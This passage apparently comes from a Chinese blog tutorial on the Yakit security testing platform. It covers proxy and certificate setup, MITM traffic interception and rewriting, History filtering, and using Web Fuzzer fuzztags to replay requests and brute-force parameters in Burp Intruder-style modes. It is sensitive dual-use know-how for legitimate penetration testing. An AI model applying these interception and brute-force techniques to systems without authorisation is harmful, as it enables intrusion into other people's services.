style="zoom:45%;"><ul><li>第二种方式：第二种删除方式，主要是为了解决在第一种方式的基础上删除按钮失效或者证书列表中其他的证书误删除的方法。</li></ul><ol><li>打开cmd→输入mmc→点击<code>文件</code>菜单，选择<code>添加/删除管理单元</code>→如下图找到<code>证书</code>，点击<code>添加</code></li><li>在弹出的对话框中默认选中<code>我当前的用户</code>，点击<code>完成</code>，结束后，会在<code>控制台跟节点</code>下多了一个<code>证书-当前用户</code>的节点,打开Yakit CA证书所在的位置，选择删除即可</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.18.41.png" style="zoom:45%;"><h2 id="11-5-代理和浏览器设置"><a href="#11-5-代理和浏览器设置" class="headerlink" title="11.5 代理和浏览器设置"></a>11.5 代理和浏览器设置</h2><p>Yakit MITM模块以拦截代理的方式截获所有通过代理的网络流量，包括客户端的请求数据和服务器端的响应信息。主要拦截http和https协议的流量，并通过中间人方式，对客户端请求和服务端响应进行处理，以实现安全评估测试的目的。</p><p>在日常工作中，我们最常使用的是web浏览器作为web客户端。通过设置代理，我们可以截取web浏览器的流量，并对流经Yakit代理的数据进行处理。这种方式可以模拟各种攻击场景，帮助测试人员发现应用程序中的安全漏洞。</p><p>下面我们就介绍下在常用浏览器Firefox和Google Chrome下是如何配置Yakit的代理。</p><h3 id="11-5-1-Google-Chrome代理设置"><a href="#11-5-1-Google-Chrome代理设置" class="headerlink" title="11.5.1 Google Chrome代理设置"></a>11.5.1 Google Chrome代理设置</h3><p>Google Chrome使用Yakit作为代理服务器的配置步骤如下：</p><ol><li>启动Yakit 打开 MITM 交互劫持，配置代理地址和端口 127.0.0.1:8083，点击劫持启动，确保劫持处于开启状态。</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.22.46.png" alt="截屏2024-12-25 11.22.46" style="zoom:50%;"><ol start="2"><li><p>在Chrome浏览器中，点击浏览器右上角的三个点按钮，选择“设置”选项。</p></li><li><p>在“设置”页面中，向下滚动到底部，找到“系统”选项，点击“打开代理设置”按钮</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.23.04.png" style="zoom:50%;"><ol start="4"><li><p>在“代理”选项卡中，打开<code>手动设置代理服务器</code>下的<code>使用代理服务器</code>，在“地址”和“端口”文本框中输入前面设置的Yakit MITM 的代理服务器的IP地址和端口号（127.0.0.1:8083）</p></li><li><p>点击<code>保存</code>按钮保存设置并关闭所有窗口。</p></li></ol><h3 id="11-5-2-FireFox设置"><a href="#11-5-2-FireFox设置" class="headerlink" title="11.5.2 FireFox设置"></a>11.5.2 FireFox设置</h3><p>与Google Chrome 的设置类似，在FireFox中，我们也要进行代理的设置，才能将FireFox浏览器的通信流量，通过 Yakit 的代理进行传输。详细的步骤如下：</p><ol><li>启动Yakit 打开 MITM 交互劫持，配置代理地址和端口 127.0.0.1:8083，点击劫持启动，确保劫持处于开启状态。</li><li>下载最新版Firefox浏览器，打开浏览器，点击右上角的菜单按钮（三条横线），选择<code>设置</code>选项。</li><li>左侧菜单中选择<code>常规</code>,然后下拉至最底部的<code>网络设置</code>，点击<code>设置</code></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.28.png" style="zoom:50%;"><ol start="4"><li>在<code>连接设置</code>对话框中，选择<code>手动代理配置</code>选项,在<code>HTTP代理</code>文本框中输入 Yakit 代理服务器的IP地址和端口号（默认为127.0.0.1:8083）</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.56.png" style="zoom:40%;"><ol start="5"><li>勾选<code>也将此代理用于 HTTPS</code>复选框，点击确定，设置完成。</li></ol><p>以上就是代理和浏览器设置的所有内容。当然，浏览器中，可以添加一些扩展组件，对代理服务器进行管理。如Proxy Swither、Proxy SwitchyOmega等等都是很好用的插件。</p><p>除此之外，Yakit还提供了系统代理，系统代理能帮助用户自动代理系统所有请求全局抓包。系统代理打开的具体位置在劫持界面的右上角。点击启用后即可开始全局抓包，显示“已启用”表示启用成功，系统所有请求数据包均可抓取。此功能常用来抓取微信小程序、钉钉等应用的数据包。【但是在v1.3.8-1220没有找到系统代理功能，多了一个下游代理配置，目测是用来设置多层代理的。】</p><h2 id="11-6-开始劫持"><a href="#11-6-开始劫持" class="headerlink" title="11.6 开始劫持"></a>11.6 开始劫持</h2><p>我们已经配置好了开始劫持前的准备工作。</p><p>在开始劫持前我们先对整个劫持页面进行熟悉：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.32.36.png" alt="截屏2024-12-25 11.32.36" style="zoom:50%;"><ol><li>设置代理监听主机，远程模式可以修改为0.0.0.0以监听主机所有网卡。</li><li>设置代理监听端口，设置一个不被占用的端口。</li><li>开启该选项将支持 HTTP/2.0 劫持，关闭后自动降级为HTTP1.1，开启后 HTTP2 协商失败也会自动降级。</li><li>根据填写的正则规则，对符合规则的数据包进行染色、标记、替换、打tag等操作，方便用户快速筛选出目标数据包。Yakit目前提供55条默认规则，点击<code>默认配置</code>导入即可使用。</li><li>开启启用插件则表示，进入劫持页面就会加载在侧边栏 ⑥ 当中选择的插件以及编写插件时设置了默认启动的插件。</li><li>插件商店当中的”MITM插件” 和 “端口扫描插件”类型的插件。</li><li>插件分组：将插件按照自己的使用习惯进行分组，便于在使用插件时快速勾选自己需要的插件。插件组在整个Yakit里是共用的，只要有加载插件的地方就使用插件分组。</li><li>根据关键字或者tag快速搜索所需插件。</li><li>下拉显示已创建过的分组，并进行分组选择。</li><li>高级配置：</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.20.45.png" style="zoom:50%;"><ol start="11"><li><p>为劫持再设置一个代理，通常用于访问中国大陆无法访问的网站或访问特殊网络/内网，也可用于接入xray等被动扫描。</p></li><li><p>客户端TLS：导入TSL证书，用于 mTLS（Mutual TLS）开启客户端验证的 HTTPS 网站抓包。</p></li><li><p>过滤器：通过配置过滤条件，来控制只抓/不抓哪些数据包，也可以理解为劫持的“黑白名单”。</p></li><li><p>下载Yakit证书。</p></li></ol><p>点击<code>劫持启动</code>后进入到劫持界面：选择<code>丢弃请求</code>，则该条数据不会出现在history，<code>提交数据</code>则会将该数据包记录在history 并开始劫持下一个数据包。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.26.32.png" style="zoom:50%;"><ol><li>在劫持页面的左上角的①单选框选择<code>手动劫持</code>，打开浏览器，输入你需要访问的URL（以<a href="https://baidu.com/">https://baidu.com/</a> 为例）并回车，这时你将会看到数据流量经过 Yakit 并暂停，您可以查看或修改数据包。选择<code>自动放行</code>则会放行所有的数据包，<code>被动日志</code>则为劫持模块、插件加载、被动扫描的执行日志。</li><li>选择<code>手动劫持</code>劫持到请求以后，点击右边② <code>丢弃请求</code> 则该条数据将会丢失，不在继续处理且不会出现在<code>history</code>中，③<code>提交数据</code>则会将该数据包继续传输下去并记录在<code>history</code>并开始劫持下一个数据包。</li><li>劫持到请求以后，在右边单选框④<code>劫持响应</code>处选择当前请求，则会劫持到当前请求包对应的响应数据包。选择”所有”则会劫持所有请求的响应数据包。</li><li>在整个数据包展示处，我们可以看到HTTP请求的数据进行手工的修改，数据主要包含了：请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，点击鼠标右键可以对数据包进行更多的操作：</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.29.53.png" style="zoom:50%;"><ol start="5"><li>劫持到的所有的数据包都会存入到<code>history</code>中，劫持后可以在<code>history</code>查看感兴趣的数据包。</li></ol><h2 id="11-7-标记-替换流量"><a href="#11-7-标记-替换流量" class="headerlink" title="11.7 标记/替换流量"></a>11.7 标记/替换流量</h2><p>在日常的工作中，我们需要对测试的目标网站进行流量分析；当然除了在分析流量之外，我们经常需要涉及一些操作，以实现对流量的修改。</p><p>作为一个合格的工程师，任何时候掌握对流量的完全控制权其实是非常重要的基本技能。</p><p>该功能主要是替换数据包中符合规则的内容，比如替换数据包中自己的敏感信息，对数据包进行颜色标记或者打上标签，方便对数据包进行分类，或快速找出自己感兴趣的数据包。</p><h3 id="11-7-1-导入-导出规则"><a href="#11-7-1-导入-导出规则" class="headerlink" title="11.7.1 导入/导出规则"></a>11.7.1 导入/导出规则</h3><p>在启动 MITM 之前，我们就可以配置这些规则，当然，我们也可以在 MITM 劫持过程中动态修改。</p><p>在开始劫持页面的内容规则选项我们可以看到 ①<code>默认配置</code> ② <code>导入配置</code> ③<code>导出配置</code> 三个与内容规则相关的操作选项。</p><p>我们点击默认配置选项。在弹出的对话框中，点击 ①<code>使用默认配置</code>，导入JSON以后，点击 ②<code>导入</code></p><p>即可看到成功导入官方默认的55条规则内容，如果想使用其他规则，只需将JSON文件复制进来，点击导入即可。</p><p><strong>注意</strong>，<code>全部替换</code>是本地导入的规则是否需要覆盖之前导入的规则，如果是新增规则请将全部替换关闭，如果是想进行覆盖，则可开启全部替换。</p><p>点击内容规则旁边的小齿轮，即可查看官方默认规则内容，官方规则如图所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.39.32.png" style="zoom:50%;"><p>点击右上角的<code>导出配置</code>，可以将规则导出为JSON文件，可将文件进行分享给他人使用。</p><h3 id="11-7-2-新建-编辑规则"><a href="#11-7-2-新建-编辑规则" class="headerlink" title="11.7.2 新建/编辑规则"></a>11.7.2 新建/编辑规则</h3><p>在劫持页面点击右上角<code>规则配置</code>可以查看已有规则</p><p>编写规则的部分采用 Golang 风格正则表达式：推荐使用 <a href="https://regex101.com/">https://regex101.com/</a> 调试，规则如果编译失败，则自动降级为关键字匹配。</p><p>已有的规则可以进行编辑操作，或者新增规则，编辑或新增以后点击<code>添加该规则</code>或 <code>修改</code>进行保存。</p><h3 id="11-7-3-标记替换流量案例"><a href="#11-7-3-标记替换流量案例" class="headerlink" title="11.7.3 标记替换流量案例"></a>11.7.3 标记替换流量案例</h3><p><strong>标记替换文本</strong></p><p>在规则内容页点击右上角<code>新增规则</code>，然后对每个选项进行配置。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.45.08.png" alt="截屏2024-12-25 13.45.08" style="zoom:50%;"><p>非常简单的配置就可以实现 “百度一下” 变为 YAK一下！</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.05.png" alt="截屏2024-12-25 13.48.05" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.23.png" style="zoom:50%;"><h3 id="细节说明"><a href="#细节说明" class="headerlink" title="细节说明"></a>细节说明</h3><ol><li>这些规则是 针对代理全流量的，不光会对用户在 History 看到的过滤后的请求生效，对一些已经被过滤掉的 JS 或者静态文件都是生效的，编写简单规则务必明确场景</li><li>规则的执行顺序是有意义的</li><li>规则基于 Golang 风格正则/Glob/关键字， 采取降级策略：即如果无法编译为正则，将会最后被降级为 “关键字” 匹配。</li><li>替换后的数据包将会被自动修复，用户不需担心数据包毁坏协议。</li></ol><h2 id="11-8-History"><a href="#11-8-History" class="headerlink" title="11.8 History"></a>11.8 History</h2><p>所有流经 Yakit 的请求，都会在 History 中记录下来，我们可以通过该页面，查看传输的数据内容，对数据进行测试和验证。同时，对于拦截到的历史请求，都可以基于 web fuzzer进行进一步的测试，也可以对数据包进行插件的扫描等等的操作。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.53.49.png" style="zoom:50%;"><ol><li>勾选或全选数据请求，勾选请求后可以到 ②批量操作进行批量的操作。</li><li>批量操作，具体内容如图所示。</li><li>筛选框，可以根据对协议类型、响应类型、Tags 单独或组合进行按条件筛选。</li><li>指定单独的某条数据包，单击右键后即可对该条数据进行操作，具体可操作内容如图所示。</li><li>HTTP history 内容筛选器，<code>MITM</code>： MITM交互劫持的所有流量，<code>插件</code> ：使用任何插件都会在插件-history留下请求记录。<code>爬虫</code>：之前章节学习的基础工具中的基础爬虫发出的所有请求都会记录在爬虫–history。</li><li>点击<code>fuzz</code> 该条数据会被发送至 web fuzzer模块。</li><li>该数据包中涉及的域名都会被提取出来。</li><li>根据关键字搜索某条数据包。</li><li>清空所有数据。</li></ol><p>History中的所有数据包，均支持对数据包进行单个操作，或者批量操作，具体操作可分为：</p><ul><li>选择数据包进行漏洞扫描</li><li>复制为POC模板（CSRF POPOC/yak POC/Portscan POC）</li><li>标记颜色</li><li>数据包作为数据对比</li><li>屏蔽删除</li><li>下载 Response body</li></ul><p>其次选择单个数据包也可以对数据包进行编解码，修改请求类型等操作。</p><p>History的消息列表中主要包含请求序列号、请求协议和主机名、请求的方式、服务器端返回的HTTP状态码、URL路径、网站title、网站ip、请求长度、大小、等信息。</p><p>通过这些信息，我们可以对一次客户端与服务器端交互的HTTP消息详情做出准确的分析，同时，在最左边的操作栏，点击浏览器图标可以在浏览器中打开该请求对应的url，点击箭头图标即可查看该请求详细的内容。</p><h2 id="11-9-过滤流量"><a href="#11-9-过滤流量" class="headerlink" title="11.9 过滤流量"></a>11.9 过滤流量</h2><p>在专家模式 MITM 交互劫持时会产生大量的日志记录，为了更友好的管理，Yakit提供了筛选过滤器功能。针对某些数据包我们不需要看见，或者屏蔽某些污染数据就可以输入需要过滤的条件，劫持时则不会劫持符合条件的数据包。</p><p>在劫持页面点击<code>过滤器</code>，将弹出筛选过滤器界面。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.47.07.png" style="zoom:50%;"><p>按照过滤条件的不同，过滤器划分出5个子选项，分别是：</p><ul><li>按照Hostname过滤 你可以在<code>包含Hostname</code> 输入想要仅显示的hostname，来筛选只想要看到的相关Hostname的请求。也可以在<code>排除Hostname</code>中输入不想要看到的Hostname进行排除。</li><li>按照URL路径过滤 你可以在<code>包含URL路径</code>输入想要URL路径来匹配相关的请求，也可以在<code>排除URL路径</code>中输入不想要展示的URL来过滤不想要看到的请求。</li><li>按照文件类型过滤 通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅仅显示哪些，另一个是不显示哪些。如果是仅仅显示哪些，在包含文件后缀的输入框中填写显示的文件类型，同样，如果不显示哪些文件类型，只要在<code>排除文件后缀</code>的输入框中填写不需要显示的文件类型即可。</li><li>按照Content-Type过滤 此过滤器的功能是指，根据HTTP请求头的Content-Type来排除不想要展示的相关数据包。</li><li>按照HTTP 方法过滤 此过滤器可根据HTTP请求方法进行的排除来达到过滤的目的。</li></ul><p>以上过滤条件可单选，也可多选组合来进行过滤流量。</p><h2 id="11-10-网站树视角"><a href="#11-10-网站树视角" class="headerlink" title="11.10 网站树视角"></a>11.10 网站树视角</h2><p>网站树将历史请求以树结构的形式进行展示，选中域名，可查看该域名对应的数据信息与详情。下图所示网站树为一次测试中，通过浏览器浏览的历史记录在网站树视角页面中的展现结果。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.54.05.png" alt="截屏2024-12-25 15.54.05" style="zoom:50%;"><p>从图中我们可以看出，整个页面的的左侧为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；</p><p>右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。</p><p>基于左边的树形结构，我们可以选择某个分支，对指定的路径进行端口扫描、爆破和漏洞检测。</p><h1 id="十二、Web-Fuzzer"><a href="#十二、Web-Fuzzer" class="headerlink" title="十二、Web Fuzzer"></a>十二、Web Fuzzer</h1><h2 id="12-1-重放"><a href="#12-1-重放" class="headerlink" title="12.1 重放"></a>12.1 重放</h2><p>在日常工作中可以使用 Web Fuzzer进行请求与响应的消息验证分析，比如修改请求参数，验证输入的漏洞；修改请求参数，验证逻辑越权；从拦截历史记录中，捕获特征性的请求消息进行请求重放。</p><p>Web Fuzzer 界面如图所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.02.00.png" style="zoom:50%;"><p>在左上角，有一个<code>发送请求</code>按钮，当我们对请求的消息编辑完之后，点击此按钮即发送请求给服务器端。</p><p>响应消息区为对应的请求消息点击<code>发送请求</code>按钮后，服务器端的反馈消息。通过修改请求消息的参数来比对分析每次应答消息之间的差异，能更好的帮助我们分析系统可能存在的漏洞。</p><ul><li>简单案例. 请求其他网站</li></ul><p>假如我们需要将请求发送到其他网站，我们可以直接修改<code>Host</code>请求头，然后点击<code>发送数据包</code>按钮即可。yaklang会自动识别<code>Host</code>请求头中的域名并将请求发送到对应的服务器。</p><p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.05.43.png" alt="截屏2024-12-25 16.05.43"></p><h2 id="12-2-爆破"><a href="#12-2-爆破" class="headerlink" title="12.2 爆破"></a>12.2 爆破</h2><h3 id="12-2-1-概述"><a href="#12-2-1-概述" class="headerlink" title="12.2.1 概述"></a>12.2.1 概述</h3><p>使用过Burp Suite的都知道，它有一个Intruder模块，它的核心其实并不是某一个功能，而是一整套的操作流：</p><ol><li>劫持数据包</li><li>发送到Intruder</li><li>清除占位符，添加新的占位符</li><li>为占位符设置一个值序列，如字典，多行字符串，一串数字等</li><li>设置爆破模式，开始爆破</li></ol><p>后面几步是很繁琐的，很多时候大家花了大功夫的时间在设置上。</p><p>Yakit 使用了一种全新的方法，<strong>可以直接在Web fuzzer模块中完成重放与爆破两种工作</strong>，更轻松地实现批量发包模糊测试。</p><h3 id="12-2-2-模糊测试标签"><a href="#12-2-2-模糊测试标签" class="headerlink" title="12.2.2 模糊测试标签"></a>12.2.2 模糊测试标签</h3><p>首先，介绍模糊测试标签(fuzztag)。</p><p>fuzztag是一种小型语法结构，它大概长这个样子：<code>{{tagname(tagvalue)}}</code>，例如<code>{{randint(1,100)}}</code>生成1-100随机整数。</p><p>fuzztag还有许多变体，例如它可以嵌套调用：<code>{{base64(randint(100))}}</code>生成base64编码后的1-100随机整数。</p><p>想要了解fuzztag可用标签和使用样例的同学可以查看这篇文章：<a href="https://yaklang.com/docs/newforyak/fuzztag">Fuzz Tag Playbook</a>。</p><h3 id="12-2-3-使用模糊测试标签进行爆破"><a href="#12-2-3-使用模糊测试标签进行爆破" class="headerlink" title="12.2.3 使用模糊测试标签进行爆破"></a>12.2.3 使用模糊测试标签进行爆破</h3><h4 id="1）直接输入fuzztag"><a href="#1）直接输入fuzztag" class="headerlink" title="1）直接输入fuzztag"></a>1）直接输入fuzztag</h4><p>在我们了解了fuzztag之后，我们就可以开始使用它来进行爆破了。使用fuzztag最直接的方式是直接在Web fuzzer模块中输入，例如我们爆破数字1-10，只需要简单地在想爆破的位置输入<code>{{int(1-10)}}</code>即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.12.09.png" style="zoom:50%;"><p>可以看到当Web Fuzzer发送了不止一个数据包时，Response自动转换为列表形式展示，当我们点击Response列表中的某一项时，会在右下角显示这次请求的响应，可以看到fuzztag已经被替换为实际的值(这里为10)，另外我们也可以通过点击轻松地切换查看请求与响应。</p><h4 id="2）右键插入fuzztag"><a href="#2）右键插入fuzztag" class="headerlink" title="2）右键插入fuzztag"></a>2）右键插入fuzztag</h4><p>与之相对的，Web Fuzzer也提供了更简单的方式来插入fuzztag，我们只需要在Web Fuzzer中右键选择<strong>插入标签/字典</strong>即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.16.31.png" style="zoom:50%;"><p>这是yakit最近新增的功能，当你在Web Fuzzer中鼠标点选了某个位置时，会弹出一个插入标签的悬浮框，在这个悬浮框中你可以选择插入一些常见的fuzztag。</p><h4 id="3）插入空字节标签：hexd-00"><a href="#3）插入空字节标签：hexd-00" class="headerlink" title="3）插入空字节标签：hexd(00)"></a>3）插入空字节标签：<code>hexd(00)</code></h4><p><code>hexd(00)</code>将在所在位置插入一个空字节，可以用于测试空字节截断漏洞。这实际上也体现了fuzztag的另外一个好处，我们不需要Burp Suite的十六进制编辑器，也可以轻松地插入十六进制数据。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.17.10.png" style="zoom:50%;"><h4 id="4）插入临时字典"><a href="#4）插入临时字典" class="headerlink" title="4）插入临时字典"></a>4）插入临时字典</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.20.19.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.19.37.png" style="zoom:50%;"><p>这个功能将用户输入的内容存储到临时文件中，并插入为fuzztag，他有两个模式，一个是插入整个文本内容，另外一个则是按文件内容的每一行插入（例如用户输入了5行字符串，则会发送5个请求）。</p><h4 id="5）插入模糊测试字典标签"><a href="#5）插入模糊测试字典标签" class="headerlink" title="5）插入模糊测试字典标签"></a>5）插入模糊测试字典标签</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.23.06.png" alt="截屏2024-12-25 16.23.06" style="zoom:50%;"><p>这个功能实际上是与yakit中的另外一个模块：payload的联动。当你再payload中导入了字典后，你可以使用这个功能点击闪电按钮将字典中的内容按行插入为fuzztag。</p><h4 id="6）插入热加载标签"><a href="#6）插入热加载标签" class="headerlink" title="6）插入热加载标签"></a>6）插入热加载标签</h4><p>热加载的使用门槛较高。</p><h4 id="7）插入文件标签"><a href="#7）插入文件标签" class="headerlink" title="7）插入文件标签"></a>7）插入文件标签</h4><p>这个功能与<strong>插入临时字典</strong>类似，一共有三个模式，第一个是插入整个文本内容，第二个是按文件内容的每一行插入，第三个则是按文件夹下的每一个文件插入（例如该文件夹下一共有5个文件，则会发送5个请求）。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.28.38.png" style="zoom:50%;"><h3 id="12-2-4-爆破模式"><a href="#12-2-4-爆破模式" class="headerlink" title="12.2.4 爆破模式"></a>12.2.4 爆破模式</h3><p>Burp Suite中存在四种爆破模式：Sniper，Battering ram，Pitchfork，Cluster bomb。</p><blockquote><p>1、Sinper（狙击手）</p><p>  sinper使用一个字典，主要是将标记的数据进行逐个遍历替换<br>          爆破次数=标记字段数*字典字段数量</p><p>2、Battering ram（攻城槌）</p><p> Battering ram使用一个字典，将包内所有标记的数据进行同时替换再发出</p><p> 爆破次数=字典字段数量</p><p>3、Pitchfork（干草叉）</p><p>Pitchfork对每个标记字段单独设置字典，按照一一对应的关系取最少的组合</p><p>爆破次数=最少的字段字段数</p><p>4、Cluster bomb（集束炸弹）</p><p>Cluster bomb使用穷举法，对每个标记字段都遍历字典</p><p>标记三处，第一处字典3个，第二处字典2个，第三处字典3个，爆破次数：3*2*3</p></blockquote><p>但实际上我们真的需要爆破模式吗？它是不可替代的吗？</p><p>我们先来剖析一下这四个爆破模式的本质：</p><ol><li>Sniper：单个参数爆破，如果此模式下存在多个占位符，则只同时爆破一个占位符，其他占位符保持不变，例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，此时爆破时会先爆破value，而<code>§value2§</code>则保持不变，发送的包为：<code>{"key": "爆破值", "key2": "value2"}</code></li><li>Battering ram：多个参数同时使用一个字典爆破，例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，此时爆破时会先同时爆破value和value2，发送的包为：<code>{"key": "爆破值", "key2": "爆破值"}</code></li><li>Pitchfork：多个参数同时爆破，使用不同字典，字典间一一对应，行数不一致时则取最小值。例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，使用的第一个字典为<code>1,2</code>，第二个字典为<code>3,4</code>，则发送的包为：<code>{"key": "1", "key2": "3"}</code>，<code>{"key": "2", "key2": "4"}</code></li><li>Cluster bomb：多个参数同时爆破，使用不同字典，字典间做笛卡尔乘积模式。例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，使用的第一个字典为<code>1,2</code>，第二个字典为<code>3,4</code>，则发送的包为：<code>{"key": "1", "key2": "3"}</code>，<code>{"key": "1", "key2": "4"}</code>，<code>{"key": "2", "key2": "3"}</code>，<code>{"key": "2", "key2": "4"}</code></li></ol><p> 根据上述的分析，我们可以看到爆破模式实际上主要服务于多个参数爆破且使用不同字典的情况，我们有没有更好的方式来替代爆破模式呢？答案是肯定的，我们依然可以使用fuzztag来实现。</p><ul><li>集束炸弹模式</li></ul><p>首先我们来看看多参数的情况下fuzztag的默认表现，实际上他是类似于Cluster bomb爆破模式：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.43.23.png" style="zoom:50%;"><p>可以看到一共发送了4个包，和Cluster bomb爆破模式一致。</p><ul><li>攻城槌模式</li></ul><p>那么我们要如何使用fuzztag来实现Battering ram爆破模式呢？我们只需要在每个参数的位置插入相同的fuzztag即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.46.18.png" style="zoom:50%;"><p>但是本质上仍然是集束炸弹模式。这里我觉得官方文档解释有错误。实际上应该是借助分组的方式来实现，像下面这样。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.48.14.png" alt="截屏2024-12-25 16.48.14" style="zoom:50%;"><ul><li>干草叉模式</li></ul><p>我们再来看看如何使用fuzztag实现Pitchfork爆破模式，这时候需要学习fuzztag的一个小小的新语法。我们知道fuzztag它大概长这个样子：<code>{{tagname(tagvalue)}}</code>，但实际上我们可以给他分组，就像这个样子：<code>{{tagname::1(tagvalue)}}</code>。</p><p>两个冒号后面的数字表示分组，分组的意思是：<strong>同一个分组的fuzztag会被替换为同一个 Index 的值</strong>。例如我们想要实现Pitchfork爆破模式，我们只需要在每个参数的位置插入fuzztag，并且在每个fuzztag后面加上相同的分组标识即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.51.54.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.54.03.png" style="zoom:50%;"><p>我们可以发现Burp suite的爆破模式并不是必须的，我们可以通过fuzztag加分组的方式来实现更加灵活的爆破模式。</p><h2 id="12-3-高级配置"><a href="#12-3-高级配置" class="headerlink" title="12.3 高级配置"></a>12.3 高级配置</h2><p>爆破时使用代理，或者我们需要在爆破时使用国密TLS等场景，这时候我们就需要对Web Fuzzer进行一些高级配置了。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.00.43.png" style="zoom:50%;"><h3 id="12-3-1-强制HTTPS"><a href="#12-3-1-强制HTTPS" class="headerlink" title="12.3.1 强制HTTPS"></a>12.3.1 强制HTTPS</h3><p>开启<strong>强制HTTPS</strong>选项，可以使得这次请求强制使用HTTPS协议而非HTTP协议进行通信，这在某些网站要求强制使用HTTPS时非常有用。</p><h3 id="12-3-2-国密TLS"><a href="#12-3-2-国密TLS" class="headerlink" title="12.3.2 国密TLS"></a>12.3.2 国密TLS</h3><p>开启<strong>国密TLS</strong>选项，可以使得这次请求使用国密TLS协议进行通信，可以在某些网站要求使用国密TLS进行通信时使用。</p><h3 id="12-3-3-真实Host"><a href="#12-3-3-真实Host" class="headerlink" title="12.3.3 真实Host"></a>12.3.3 真实Host</h3><p>我们知道，Web Fuzzer在默认情况下会从请求包中提取Host请求头来作为我们要通信目标，但是有时候我们需要手动指定Host请求头，这时候我们就可以填写<strong>真实Host</strong>，这样Web 